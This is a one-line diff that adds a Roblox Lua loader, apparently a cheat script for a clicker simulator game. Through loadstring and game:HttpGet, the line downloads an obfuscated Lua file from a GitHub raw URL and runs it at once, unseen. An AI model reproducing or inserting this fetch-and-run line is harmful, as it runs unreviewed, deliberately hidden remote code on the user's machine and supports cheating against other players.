@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AdminEvilDRagon/Quadra-simulator-obfusecated/main/Quadra%20Clicker%20Simulator%20obfuse.lua", true))()
